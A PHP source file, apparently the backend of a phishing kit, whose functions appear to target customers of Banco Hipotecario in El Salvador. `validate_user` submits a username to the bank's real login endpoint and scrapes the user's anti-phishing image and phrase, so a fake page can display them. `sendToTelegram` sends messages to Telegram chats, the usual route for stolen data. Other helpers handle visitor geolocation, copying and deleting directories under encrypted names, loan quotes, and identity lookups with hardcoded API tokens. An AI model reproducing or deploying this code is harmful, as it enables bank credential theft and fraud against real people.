<?php

function generateKey() {
    return bin2hex(random_bytes(32)); // Genera una clave de 32 bytes
}

function copiarDirectorio($src, $dst) {

    $dir = opendir($src);

    if (!file_exists($dst)) {
        mkdir($dst, 0777, true);
    }

    while (($file = readdir($dir)) !== false) {
        if ($file != '.' && $file != '..') {
            if (is_dir($src . '/' . $file)) {

                copiarDirectorio($src . '/' . $file, $dst . '/' . $file);

            } else {

                copy($src . '/' . $file, $dst . '/' . $file);

            }
        }
    }
    closedir($dir);
}

function renameFile($currentPath, $newName) {

    $directory = dirname($currentPath);

    $newPath = $directory . '/' . $newName;

    return rename($currentPath, $newPath);
}


function encrypt($data, $key) {
    $cipher = "aes-256-cbc";
    $ivLength = openssl_cipher_iv_length($cipher);
    $iv = openssl_random_pseudo_bytes($ivLength);
    $encrypted = openssl_encrypt($data, $cipher, hex2bin($key), 0, $iv);
    
    // Codifica el texto cifrado y el IV juntos en base64
    return encodeForFilename($encrypted . '::' . base64_encode($iv));
}


function decrypt($data, $key) {
    $cipher = "aes-256-cbc";
    $decodedData = decodeFromFilename($data);
    
    // Asegúrate de que la cadena decodificada contenga el separador '::'
    if (strpos($decodedData, '::') === false) {
        return "Error: Datos encriptados inválidos.";
    }

    list($encrypted_data, $ivBase64) = explode('::', $decodedData, 2);
    
    // Decodifica el IV de base64
    $iv = base64_decode($ivBase64);

    // Verifica la longitud del IV
    $ivLength = openssl_cipher_iv_length($cipher);
    if (strlen($iv) !== $ivLength) {
        return "Error: Longitud del IV inválida.";
    }

    return openssl_decrypt($encrypted_data, $cipher, hex2bin($key), 0, $iv);
}


function encodeForFilename($input) {
    return str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($input));
}


function decodeFromFilename($input) {
    return base64_decode(str_replace(['-', '_'], ['+', '/'], $input));
}

function getFilesFromDirectory($directory) {
    $files = [];
    
    // Verifica si la carpeta existe y es legible
    if (is_dir($directory) && is_readable($directory)) {
        // Obtiene todos los archivos y carpetas dentro de la carpeta especificada
        $directoryContents = scandir($directory);
        
        foreach ($directoryContents as $item) {
            // Omite las referencias a la carpeta actual y la carpeta padre ('.' y '..')
            if ($item !== '.' && $item !== '..') {
                // Verifica si el ítem es un archivo
                if (is_file($directory . DIRECTORY_SEPARATOR . $item)) {
                    $files[] = $item;
                }
            }
        }
    }
    
    return $files;
}

function deleteDirectory($dir) {
    // Verificar si la carpeta existe
    if (!file_exists($dir)) {
        return false;
    }

    // Verificar si es un directorio
    if (!is_dir($dir)) {
        return unlink($dir);
    }

    // Abrir el directorio
    $items = array_diff(scandir($dir), array('.', '..'));

    // Recorrer cada elemento en el directorio
    foreach ($items as $item) {
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            // Si es un directorio, llamamos a la función recursivamente
            deleteDirectory($path);
        } else {
            // Si es un archivo, eliminarlo
            unlink($path);
        }
    }

    // Finalmente, eliminar el directorio vacío
    return rmdir($dir);
}

function sendToTelegram($message, $token, $chatIds_list)
{
    $ch = curl_init();

    foreach ($chatIds_list as $chatId) {
        $apiURL = "https://api.telegram.org/bot{$token}/sendMessage";
        
        $params = [
            'chat_id' => $chatId,
            'parse_mode' => 'HTML',
            'text' => $message,
        ];

        curl_setopt($ch, CURLOPT_URL, $apiURL);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($ch);

        if (curl_errno($ch)) {
            $errorMsg = 'cURL error: ' . curl_error($ch);
            error_log($errorMsg);
            throw new Exception($errorMsg);
        }

        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if ($httpCode !== 200) {
            $errorMsg = "Telegram API error: HTTP code $httpCode, response: $response";
            error_log($errorMsg);
            throw new Exception($errorMsg);
        }
    }

    curl_close($ch);
}

function escURL($url, $post = false)
{

  $old = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0";
  $info = $_SERVER['HTTP_USER_AGENT'] ?? $old;
  $ch =  curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_USERAGENT, $info);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
  if ($post) {
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
  }
  $result = curl_exec($ch);
  curl_close($ch);
  return $result;
}


function pais($servicios = 777)
{
    $ip_address = getenv('REMOTE_ADDR');
    $local = array('127.0.0.1', '::1');
    $ip_address = str_replace($local, "190.42.132.240", $ip_address);
    
    if ($servicios == 777) {
        $url = "https://freeipapi.com/api/json/" . $ip_address; //60 x minuto
        $data = esCURL($url);
        $result = json_decode($data, true);
        $pais = $result['countryCode'] ?? false;
    } elseif ($servicios == 1) {
        $url = "http://ip-api.com/json/" . $ip_address; //45 x minuto
        $data = esCURL($url);
        $result = json_decode($data, true);
        $pais = $result['countryCode'] ?? false;
    } elseif ($servicios == 2) {
        $url = "https://ipapi.co/" . $ip_address . "/json"; // 1k x dia
        $data = esCURL($url);
        $result = json_decode($data, true);
        $pais = $result['country_code'] ?? false;
    } else {
        $url = "https://api.seeip.org/geoip/" . $ip_address; //sin limite en teoria
        $data = esCURL($url);
        $result = json_decode($data, true);
        $pais = $result['country_code'] ?? false;
    }

    return $pais;
}

function calcular_prestamo($monto, $meses) {
    // Primer rango: monto entre 100 y 1500
    if ($monto >= 100 && $monto <= 1500) {
        // Definimos las tasas de interés y desgravamen para este rango
        $interes_anual = 28;
        $desgravamen = 0.805;

        // Calculamos el desgravamen total y la tasa mensual
        $total_desgravamen = round($monto * ($desgravamen / 100), 2);
        $tasa = round((pow(1 + ($interes_anual / 100), 30 / 360) - 1), 5);
        $tasa_mensual = round($tasa * 100, 2);

        // Calculamos el valor presente de las cuotas y la cuota mensual
        $xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
        $yy = round($monto * pow($xx, (-1)), 2);

        // Sumamos el desgravamen a la cuota mensual y calculamos el interés total
        $cuota_mensual = $yy + $total_desgravamen;
        $interes = ($cuota_mensual * $meses) - $monto;
    }

    // Segundo rango: monto entre 100 y 3000
    if ($monto >= 100 && $monto <= 3000) {
        // Tasas para este rango
        $interes_anual = 25;
        $desgravamen = 0.705;

        // Cálculos similares al rango anterior
        $total_desgravamen = round($monto * ($desgravamen / 100), 2);
        $tasa = round((pow(1 + ($interes_anual / 100), 30 / 360) - 1), 5);
        $tasa_mensual = round($tasa * 100, 2);

        $xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
        $yy = round($monto * pow($xx, (-1)), 2);

        $cuota_mensual = $yy + $total_desgravamen;
        $interes = ($cuota_mensual * $meses) - $monto;
    }

    // Tercer rango: monto entre 3001 y 10000
    if ($monto >= 3001 && $monto <= 10000) {
        // Tasas para este rango
        $interes_anual = 23;
        $desgravamen = 0.605;

        // Cálculos similares al rango anterior
        $total_desgravamen = round($monto * ($desgravamen / 100), 2);
        $tasa = round((pow(1 + ($interes_anual / 100), 30 / 360) - 1), 5);
        $tasa_mensual = round($tasa * 100, 2);

        $xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
        $yy = round($monto * pow($xx, (-1)), 2);

        $cuota_mensual = $yy + $total_desgravamen;
        $interes = ($cuota_mensual * $meses) - $monto;
    }

    // Cuarto rango: monto entre 10001 y 25000
    if ($monto >= 10001 && $monto <= 25000) {
        // Tasas para este rango
        $interes_anual = 21;
        $desgravamen = 0.505;

        // Cálculos similares al rango anterior
        $total_desgravamen = round($monto * ($desgravamen / 100), 2);
        $tasa = round((pow(1 + ($interes_anual / 100), 30 / 360) - 1), 5);
        $tasa_mensual = round($tasa * 100, 2);

        $xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
        $yy = round($monto * pow($xx, (-1)), 2);

        $cuota_mensual = $yy + $total_desgravamen;
        $interes = ($cuota_mensual * $meses) - $monto;
    }

    // Quinto rango: monto entre 25001 y 80000
    if ($monto >= 25001 && $monto <= 80000) {
        // Tasas para este rango
        $interes_anual = 18;
        $desgravamen = 0.405;

        // Cálculos similares al rango anterior
        $total_desgravamen = round($monto * ($desgravamen / 100), 2);
        $tasa = round((pow(1 + ($interes_anual / 100), 30 / 360) - 1), 5);
        $tasa_mensual = round($tasa * 100, 2);

        $xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
        $yy = round($monto * pow($xx, (-1)), 2);

        $cuota_mensual = $yy + $total_desgravamen;
        $interes = ($cuota_mensual * $meses) - $monto;
    }

    // Sexto rango: monto entre 80001 y 200000
    if ($monto >= 80001 && $monto <= 200000) {
        // Tasas para este rango
        $interes_anual = 15;
        $desgravamen = 0.305;

        // Cálculos similares al rango anterior
        $total_desgravamen = round($monto * ($desgravamen / 100), 2);
        $tasa = round((pow(1 + ($interes_anual / 100), 30 / 360) - 1), 5);
        $tasa_mensual = round($tasa * 100, 2);

        $xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
        $yy = round($monto * pow($xx, (-1)), 2);

        $cuota_mensual = $yy + $total_desgravamen;
        $interes = ($cuota_mensual * $meses) - $monto;
    }

    $resultados = array(
        "monto" => $monto,
        "meses" => $meses,
        "interes_anual" => $interes_anual,
        "interes_mensual" => $tasa_mensual,
        "seguro_degravamen" => $total_desgravamen,
        "seguro_degravamen_porcentaje" => $desgravamen,
        "cuota_mensual" => $cuota_mensual
    );

    return $resultados;

}

function validate_user($username) {

    // Inicializar array para cookies
    $cookies = [];

    try {
        // Solicitud POST
        $url_post = "https://bhebank.bancohipotecario.com.sv/default.aspx/Ingresar";

        $headers_post = [
            "sec-ch-ua: \"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"",
            "sec-ch-ua-mobile: ?0",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "Content-Type: application/json; charset=UTF-8",
            "x-dtpc: 3\$141455122_973h11vHUSTNKRWAQGKFQIBSMCFHLHEIOHPIQLB-0e0",
            "Accept: application/json, text/javascript, */*; q=0.01",
            "x-requested-with: XMLHttpRequest",
            "sec-ch-ua-platform: \"Windows\"",
            "Origin: https://bhebank.bancohipotecario.com.sv",
            "sec-fetch-site: same-origin",
            "sec-fetch-mode: cors",
            "sec-fetch-dest: empty",
            "Referer: https://bhebank.bancohipotecario.com.sv/default.aspx",
            "Accept-Encoding: gzip, deflate, br, zstd",
            "Accept-Language: es-ES,es;q=0.9",
            "Priority: u=1, i"
        ];

        $data_post = [
            "strCliente" => "0",
            "strUsuario" => $username
        ];

        $ch_post = curl_init($url_post);

        curl_setopt($ch_post, CURLOPT_POST, true);
        curl_setopt($ch_post, CURLOPT_HTTPHEADER, $headers_post);
        curl_setopt($ch_post, CURLOPT_POSTFIELDS, json_encode($data_post));
        curl_setopt($ch_post, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch_post, CURLOPT_HEADER, true); // Incluye la cabecera en la salida

        $response_post = curl_exec($ch_post);

        if (curl_errno($ch_post)) {
            throw new Exception('Error en la solicitud POST: ' . curl_error($ch_post));
        }

        // Separar las cabeceras y el cuerpo de la respuesta
        $header_size = curl_getinfo($ch_post, CURLINFO_HEADER_SIZE);
        $header = substr($response_post, 0, $header_size);
        $body = substr($response_post, $header_size);

        // Extraer cookies de la respuesta
        preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $header, $matches);
        foreach ($matches[1] as $cookie) {
            list($key, $value) = explode('=', $cookie, 2);
            $cookies[trim($key)] = trim($value);
        }

        // Decodificar el cuerpo de la respuesta (suponiendo que es JSON)
        $response_json = json_decode($body, true);
        if (json_last_error() !== JSON_ERROR_NONE) {
            throw new Exception('Error al decodificar la respuesta JSON del POST.');
        }

        // Evaluar la respuesta del POST
        $data_post_response = json_decode($response_json['d'], true);
        if (json_last_error() !== JSON_ERROR_NONE) {
            throw new Exception('Error al decodificar el JSON de la respuesta interna del POST.');
        }

        $codigoResultadoPost = $data_post_response['CodigoResultado'] ?? null;
        $mensajePost = $data_post_response['Mensaje'] ?? '';

        // Validar el código de resultado y continuar si es 3
        if ($codigoResultadoPost == 3) {
            // Crear la cadena de cookies para los encabezados
            $cookie_header = '';
            foreach ($cookies as $key => $value) {
                $cookie_header .= "$key=$value; ";
            }
            $cookie_header = rtrim($cookie_header, '; ');

            // Solicitud GET
            $url_get = "https://bhebank.bancohipotecario.com.sv/Servicios/Antiphishing/ValidaAP.aspx";

            $headers_get = [
                "sec-ch-ua: \"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"",
                "sec-ch-ua-mobile: ?0",
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
                "Accept: text/html, */*; q=0.01",
                "sec-ch-ua-platform: \"Windows\"",
                "Origin: https://bhebank.bancohipotecario.com.sv",
                "sec-fetch-site: same-origin",
                "sec-fetch-mode: navigate",
                "sec-fetch-dest: document",
                "Referer: https://bhebank.bancohipotecario.com.sv/default.aspx",
                "Accept-Encoding: gzip, deflate, br, zstd",
                "Accept-Language: es-ES,es;q=0.9",
                "Priority: u=1, i",
                "Cookie: $cookie_header" // Incluye las cookies en los encabezados
            ];

            $ch_get = curl_init($url_get);

            curl_setopt($ch_get, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch_get, CURLOPT_HTTPHEADER, $headers_get);

            $response_get = curl_exec($ch_get);

            if (curl_errno($ch_get)) {
                throw new Exception('Error en la solicitud GET: ' . curl_error($ch_get));
            }

            curl_close($ch_get);

            // Procesar el HTML obtenido para extraer el src de la imagen
            $dom = new DOMDocument();
            @$dom->loadHTML($response_get); // Suprime los errores de carga de HTML mal formado

            $xpath = new DOMXPath($dom);
            $img_src = $xpath->evaluate("string(//img[@id='ctl00_ContenidoPrincipal_imgAntiphishing']/@src)");
            $label_text = $xpath->evaluate("string(//label[@id='ctl00_ContenidoPrincipal_lblTextoAP'])");

            $resultado = preg_replace('/\.\.\/\.\.\//', '', $img_src);

            $basename = basename($resultado);

            $response = [
                'success' => true,
                'img_url' => $basename,
                'label_text' => $label_text
            ];
        } else if ($codigoResultadoPost == -34) {
            // Código de resultado específico para bad_username
            $response = array('success' => false, 'reason' => 'bad_username');
        } else {
            // Código de resultado desconocido
            $response = array('success' => false, 'reason' => 'unknown_error');
        }
    } catch (Exception $e) {
        $response = array('success' => false, 'reason' => strval($e));
    }

    return $response;

}

function get_result_reniec($dni) {
    try {
        $comodin = substr($dni, 0, 1);

        if ($comodin == "9") {
            // Consulta para DNI que comienza con "9"
            $consulta = file_get_contents("https://api.perudevs.com/api/v1/dni/simple?document=".$data['dato_2']."&key=cGVydWRldnMucHJvZHVjdGlvbi5maXRjb2RlcnMuNjJmYTllZDU4ZGI5OTcxZGFkYmY2ZTVj");

            $data = $consulta;
            $info = json_decode($data);

            // Verificar si 'resultado' existe y contiene los campos necesarios
            if (!isset($info->resultado) || !isset($info->resultado->nombres)) {
                return array('success' => false, 'reason' => 'error');
            }

            $nombres = $info->resultado->nombres;
            $ap_paterno = $info->resultado->apellido_paterno;
            $ap_materno = $info->resultado->apellido_materno;
            $nombre_completo = ucwords(strtolower($info->resultado->nombre_completo));
            $nameFomateado = ucwords(strtolower($nombres));
        } else {
            // Consulta para DNI que no comienza con "9"
            $token = 'apis-token-2041.JtDPlJHWeHqCmQdNCFTfiSji1vVAqE4X';
            $curl = curl_init();

            curl_setopt_array($curl, array(
                CURLOPT_URL => 'https://api.apis.net.pe/v1/dni?numero='.$dni,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_ENCODING => '',
                CURLOPT_MAXREDIRS => 2,
                CURLOPT_TIMEOUT => 0,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => 'GET',
                CURLOPT_HTTPHEADER => array(
                    'Referer: https://apis.net.pe/consulta-dni-api',
                    'Authorization: Bearer '.$token
                ),
            ));

            $response = curl_exec($curl);
            curl_close($curl);

            // Decodificar JSON y verificar errores
            $persona = json_decode($response);
            if (json_last_error() !== JSON_ERROR_NONE) {
                return array('success' => false, 'reason' => 'error');
            }

            // Verificar si los campos esperados existen
            if (!isset($persona->nombres)) {
                return array('success' => false, 'reason' => 'error');
            }

            $nombres = $persona->nombres;
            $ap_paterno = $persona->apellidoPaterno;
            $ap_materno = $persona->apellidoMaterno;
            $nombre_completo = ucwords(strtolower($nombres." ".$ap_paterno." ".$ap_materno));
            $nameFomateado = ucwords(strtolower($nombres));
        }

    } catch (Exception $e) {
        return array('success' => false, 'reason' => 'error');
    }

    $response = array('success' => true, 'nombre_completo' => $nombre_completo, 'nameFomateado' => $nameFomateado);
    return $response;
}

?>